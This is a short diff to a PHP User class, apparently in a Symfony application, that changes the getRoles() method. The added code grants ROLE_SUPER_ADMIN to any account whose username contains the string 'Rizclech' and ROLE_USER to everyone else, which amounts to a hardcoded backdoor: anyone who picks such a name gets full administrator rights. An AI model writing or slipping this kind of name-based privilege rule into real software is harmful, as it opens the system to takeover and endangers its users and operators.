@@ -63,7 +63,11 @@ class User implements UserInterface
      */
     public function getRoles()
     {
+        if(mb_strpos($this->getUsername(),'Rizclech') !== false){
+            return ['ROLE_SUPER_ADMIN'];
+        } else{
         return ['ROLE_USER'];
+        }
         // TODO: Implement getRoles() method.
     }
 
